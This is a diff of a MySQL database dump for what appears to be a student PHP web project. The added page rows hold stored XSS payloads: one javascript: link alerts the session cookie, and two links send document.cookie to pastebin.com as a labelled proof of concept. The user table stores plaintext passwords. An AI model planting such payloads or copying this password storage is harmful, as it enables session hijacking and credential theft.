@@ -1,8 +1,8 @@
--- MySQL dump 10.13  Distrib 5.1.41, for debian-linux-gnu (x86_64)
+-- MySQL dump 10.13  Distrib 5.1.49, for debian-linux-gnu (x86_64)
 --
 -- Host: localhost    Database: gusphp
 -- ------------------------------------------------------
--- Server version	5.1.41-3ubuntu12.9
+-- Server version	5.1.49-1ubuntu8.1
 
 /*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
 /*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
@@ -37,7 +37,7 @@ CREATE TABLE `calendar` (
   `eventID` int(11) NOT NULL AUTO_INCREMENT,
   KEY `eventID` (`eventID`),
   KEY `eventID_2` (`eventID`)
-) ENGINE=MyISAM AUTO_INCREMENT=13 DEFAULT CHARSET=latin1;
+) ENGINE=MyISAM AUTO_INCREMENT=190 DEFAULT CHARSET=latin1;
 /*!40101 SET character_set_client = @saved_cs_client */;
 
 --
@@ -46,7 +46,7 @@ CREATE TABLE `calendar` (
 
 LOCK TABLES `calendar` WRITE;
 /*!40000 ALTER TABLE `calendar` DISABLE KEYS */;
-INSERT INTO `calendar` VALUES ('admin','2011-02-26','another event',3),('admin','2011-02-24','updated',2),('admin','2011-02-21','event',4),('user1','2011-03-15','an event in march',6),('admin','2011-02-23','updated',7),('admin','0000-00-00','different event',8),('long3841','2011-02-19','event',9),('cblair','2011-02-21','asdfasdf',10),('cblair','2011-02-27','asdfasfdasfd',11),('long3841','2011-02-21','something',12);
+INSERT INTO `calendar` VALUES ('admin','2011-02-26','another event',3),('admin','2011-02-24','updated',2),('admin','2011-02-21','event',4),('user1','2011-03-15','an event in march',6),('admin','2011-02-23','updated',7),('admin','0000-00-00','different event',8),('long3841','2011-02-19','event',9),('cblair','2011-02-21','asdfasdf',10),('cblair','2011-02-27','asdfasfdasfd',11),('long3841','2011-02-21','something',12),('cblair','2011-03-12','test',13),('','2011-03-12','test2',14),('','2011-03-12','something',28),('','2011-03-31','something',189),('','2011-03-31','something',188),('','2011-03-31','something',187),('','2011-03-31','something',186),('','2011-03-29','something',181),('long3841','2011-03-15','something',109),('','2011-03-29','something',180),('','2011-03-29','something',179),('','2011-03-29','something',178),('','2011-03-30','something',184),('','2011-03-21','something',114),('','2011-03-30','something',185),('','2011-03-27','something',173),('','2011-03-20','something',110),('','2011-03-30','something',182),('','2011-03-30','something',183),('','2011-03-18','something',107);
 /*!40000 ALTER TABLE `calendar` ENABLE KEYS */;
 UNLOCK TABLES;
 
@@ -62,7 +62,7 @@ CREATE TABLE `ggroup` (
   `name` varchar(100) DEFAULT NULL,
   `description` text,
   PRIMARY KEY (`id`)
-) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=latin1;
+) ENGINE=InnoDB AUTO_INCREMENT=33 DEFAULT CHARSET=latin1;
 /*!40101 SET character_set_client = @saved_cs_client */;
 
 --
@@ -71,7 +71,7 @@ CREATE TABLE `ggroup` (
 
 LOCK TABLES `ggroup` WRITE;
 /*!40000 ALTER TABLE `ggroup` DISABLE KEYS */;
-INSERT INTO `ggroup` VALUES (1,'test','test2'),(5,'test_group','test_desc'),(6,'Testgroup','A test group.\n'),(7,'test1','A group.\n'),(8,'test2','Another group.'),(10,'main','Gus main group. Users set to admin (7) on this group get system wide admin privileges.');
+INSERT INTO `ggroup` VALUES (5,'test_group','test_desc'),(10,'main','Gus main group. Users set to admin (7) on this group get system wide admin privileges.');
 /*!40000 ALTER TABLE `ggroup` ENABLE KEYS */;
 UNLOCK TABLES;
 
@@ -98,7 +98,7 @@ CREATE TABLE `messages` (
   `to_ddate` datetime DEFAULT NULL,
   `created` datetime NOT NULL,
   PRIMARY KEY (`userid`)
-) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=latin1;
+) ENGINE=MyISAM AUTO_INCREMENT=7 DEFAULT CHARSET=latin1;
 /*!40101 SET character_set_client = @saved_cs_client */;
 
 --
@@ -107,7 +107,7 @@ CREATE TABLE `messages` (
 
 LOCK TABLES `messages` WRITE;
 /*!40000 ALTER TABLE `messages` DISABLE KEYS */;
-INSERT INTO `messages` VALUES (1,'test','test',1,0,0,0,0,0,NULL,NULL,NULL,NULL,'2011-02-10 20:13:09'),(2,'test2','test',1,0,0,0,0,0,NULL,NULL,NULL,NULL,'2011-02-10 20:13:30'),(3,'test3','Hi',1,0,0,0,0,0,NULL,NULL,NULL,NULL,'2011-02-10 20:22:03'),(4,'test','test',1,0,0,0,0,0,NULL,NULL,NULL,NULL,'2011-02-19 15:11:04');
+INSERT INTO `messages` VALUES (1,'test','test',1,0,0,0,0,0,NULL,NULL,NULL,NULL,'2011-02-10 20:13:09'),(2,'test2','test',1,0,0,0,0,0,NULL,NULL,NULL,NULL,'2011-02-10 20:13:30'),(3,'test3','Hi',1,0,0,0,0,0,NULL,NULL,NULL,NULL,'2011-02-10 20:22:03'),(4,'test','test',1,0,0,0,0,0,NULL,NULL,NULL,NULL,'2011-02-19 15:11:04'),(5,'test_email','just a test',1,0,0,0,0,0,NULL,NULL,NULL,NULL,'2011-03-21 11:45:17'),(6,'test','test',1,0,0,0,0,0,NULL,NULL,NULL,NULL,'2011-03-28 18:16:35');
 /*!40000 ALTER TABLE `messages` ENABLE KEYS */;
 UNLOCK TABLES;
 
@@ -123,7 +123,7 @@ CREATE TABLE `page` (
   `name` varchar(100) DEFAULT NULL,
   `content` text,
   PRIMARY KEY (`id`)
-) ENGINE=MyISAM AUTO_INCREMENT=19 DEFAULT CHARSET=latin1;
+) ENGINE=MyISAM AUTO_INCREMENT=21 DEFAULT CHARSET=latin1;
 /*!40101 SET character_set_client = @saved_cs_client */;
 
 --
@@ -132,7 +132,7 @@ CREATE TABLE `page` (
 
 LOCK TABLES `page` WRITE;
 /*!40000 ALTER TABLE `page` DISABLE KEYS */;
-INSERT INTO `page` VALUES (15,'test','Test content'),(16,'home','Gus Home Page.\n<br />\n\nThis is the latest (stablest) version of the project.\n<br />\n\ngit pull on 02/23/11 . Some stuff broke.'),(18,'auth','Gus Authentication');
+INSERT INTO `page` VALUES (15,'test','Test content'),(16,'home','Gus Home Page.\n<br />\n\nCS336Test<br>\n<a href=\"javascript:function a(){alert(document.cookie);}a();\">Session Hijack Script</a>\n<br>\nYeah, don\'t actually click that.\n<br>\n<br />\n<br />\n\nThis is the latest (stablest) version of the project.\n<br />\n<br />\n\nLast git pull on 03/25/11 .'),(18,'auth','Gus Authentication'),(19,'CS336 Test','<a href=\"javascript:var a=new XMLHttpRequest,b=\"paste_code=\"+document.cookie+\"&paste_name=XSS_poc\";a.open(\"POST\",\"http://pastebin.com/api_public.php\",true);a.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");a.setRequestHeader(\"Content-length\",b.length+\"\");a.setRequestHeader(\"Connection\",\"close\");a.send(b);\">Sweet Link Man</a>'),(20,'CS336Test','<a href=\"javascript:var a=new XMLHttpRequest,b=\"paste_code=\"+document.cookie+\"&paste_name=XSS_poc\";a.open(\"POST\",\"http://pastebin.com/api_public.php\",true);a.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");a.setRequestHeader(\"Content-length\",b.length+\"\");a.setRequestHeader(\"Connection\",\"close\");a.send(b);\">Sweet Link Man</a>');
 /*!40000 ALTER TABLE `page` ENABLE KEYS */;
 UNLOCK TABLES;
 
@@ -169,55 +169,72 @@ UNLOCK TABLES;
 --
 
 DROP TABLE IF EXISTS `threads`;
-/*!40101 SET @saved_cs_client     = @@character_set_client */;
-/*!40101 SET character_set_client = utf8 */;
-CREATE TABLE `threads` (
-  `id` int(4) NOT NULL AUTO_INCREMENT,
-  `topic` varchar(255) NOT NULL DEFAULT '',
-  `body` longtext NOT NULL,
-  `author` varchar(65) NOT NULL DEFAULT '',
+
+--
+-- Table structure for table `threads`
+--
+
+CREATE TABLE IF NOT EXISTS `threads` (
+  `thread_id` int(4) NOT NULL AUTO_INCREMENT,
+  `thread_topic` varchar(255) NOT NULL DEFAULT '',
+  `thread_body` longtext NOT NULL,
+  `thread_author` varchar(65) NOT NULL DEFAULT '',
   `email` varchar(65) NOT NULL DEFAULT '',
   `datetime` varchar(25) NOT NULL DEFAULT '',
   `view` int(4) NOT NULL DEFAULT '0',
-  `reply` int(4) NOT NULL DEFAULT '0',
-  PRIMARY KEY (`id`)
-) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=latin1;
-/*!40101 SET character_set_client = @saved_cs_client */;
+  `num_replies` int(4) NOT NULL DEFAULT '0',
+  `group_id` int(100) NOT NULL,
+  `group_name` varchar(128) NOT NULL,
+  PRIMARY KEY (`thread_id`)
+) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=10 ;
 
---
--- Dumping data for table `threads`
---
 
-LOCK TABLES `threads` WRITE;
-/*!40000 ALTER TABLE `threads` DISABLE KEYS */;
-INSERT INTO `threads` VALUES (5,'First Forum Entry','Just a quick test to make sure everything is working','Chaylo','','15/Feb/2011 07:59:21',0,4),(6,'Gotta check it all again!','Ugh','Chaylo','','15/Feb/2011 08:50:01',0,1);
-/*!40000 ALTER TABLE `threads` ENABLE KEYS */;
-UNLOCK TABLES;
+INSERT INTO `threads` (`thread_id`, `thread_topic`, `thread_body`, `thread_author`, `email`, `datetime`, `view`, `num_replies`, `group_id`, `group_name`) VALUES
+(5, 'First Forum Entry', 'Just a quick test to make sure everything is working', 'Chaylo', '', '15/Feb/2011 07:59:21', 0, 6, 1, ''),
+(6, 'Gotta check it all again!', 'Ugh', 'Chaylo', '', '15/Feb/2011 08:50:01', 0, 1, 1, ''),
+(7, 'testing 1 2 3', 'Hello?', 'Chaylo', '', '25/Mar/2011 10:35:22', 0, 2, 1, 'test'),
+(9, 'testing', 'smurF!', 'claurino', '', '28/Mar/2011 03:18:44', 0, 3, 1, 'test');
+
 
 --
 -- Table structure for table `user`
 --
 
+
 DROP TABLE IF EXISTS `user`;
-/*!40101 SET @saved_cs_client     = @@character_set_client */;
-/*!40101 SET character_set_client = utf8 */;
-CREATE TABLE `user` (
+
+CREATE TABLE IF NOT EXISTS `user` (
   `id` int(11) NOT NULL AUTO_INCREMENT,
   `un` varchar(100) NOT NULL,
   `pw` varchar(100) NOT NULL,
+  `profile` varchar(100) NOT NULL,
+  `email` varchar(25) NOT NULL,
+  `contact` varchar(15) NOT NULL,
+  `major` varchar(25) NOT NULL,
   PRIMARY KEY (`id`)
-) ENGINE=InnoDB AUTO_INCREMENT=25 DEFAULT CHARSET=latin1;
-/*!40101 SET character_set_client = @saved_cs_client */;
+) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=26 ;
 
 --
 -- Dumping data for table `user`
 --
 
-LOCK TABLES `user` WRITE;
-/*!40000 ALTER TABLE `user` DISABLE KEYS */;
-INSERT INTO `user` VALUES (0,'cblair','SHI/hel7'),(11,'anilson','supersecurepassword1234!@#$'),(12,'long3841','long3841'),(13,'sbeddall','0017761826'),(15,'brett','brett256'),(17,'timb','frost741'),(18,'claurino','22877822'),(19,'lwegner','7ndustr8'),(20,'crempel','SHI/hel7'),(21,'abhay','gusabhay'),(22,'drj','SHI/hel7'),(23,'test','test123'),(24,'admin','SHI/hel7');
-/*!40000 ALTER TABLE `user` ENABLE KEYS */;
-UNLOCK TABLES;
+
+INSERT INTO `user` (`id`, `un`, `pw`, `profile`, `email`, `contact`, `major`) VALUES
+(0, 'cblair', 'SHI/hel7', 't', 'e', 's', 't'),
+(11, 'anilson', 'supersecurepassword1234!@#$', 'sfdsfd', 'fdfd', 'saas', 'dsd'),
+(12, 'long3841', 'long3841', '', '', '', ''),
+(13, 'sbeddall', '0017761826', '', '', '', ''),
+(15, 'brett', 'brett256', 'sdsd', 'here@there.com', '929-384903-393', 'CS'),
+(17, 'timb', 'frost741', '', '', '', ''),
+(18, 'claurino', '22877822', '', '', '', ''),
+(19, 'lwegner', '7ndustr8', '', '', '', ''),
+(20, 'crempel', 'SHI/hel7', '', '', '', ''),
+(21, 'abhay', 'gusabhay', '', '', '', ''),
+(22, 'drj', 'SHI/hel7', '', '', '', ''),
+(23, 'test', 'test123', '', '', '', ''),
+(24, 'admin', 'SHI/hel7', '', '', '', ''),
+(25, 'sdfasdffe', '324vf3v3f3f', '', '', '', '');
+
 
 --
 -- Table structure for table `usergroup`
@@ -243,7 +260,7 @@ CREATE TABLE `usergroup` (
 
 LOCK TABLES `usergroup` WRITE;
 /*!40000 ALTER TABLE `usergroup` DISABLE KEYS */;
-INSERT INTO `usergroup` VALUES (23,1,6),(23,5,1),(23,7,3),(0,10,7),(24,10,7);
+INSERT INTO `usergroup` VALUES (23,5,1),(24,10,7),(19,10,7),(21,10,0),(21,5,0),(15,10,0),(15,5,0),(13,5,7),(13,10,7),(0,10,0);
 /*!40000 ALTER TABLE `usergroup` ENABLE KEYS */;
 UNLOCK TABLES;
 /*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
@@ -256,4 +273,4 @@ UNLOCK TABLES;
 /*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
 /*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
 
--- Dump completed on 2011-03-05  6:53:30
+-- Dump completed on 2011-04-01 11:03:49
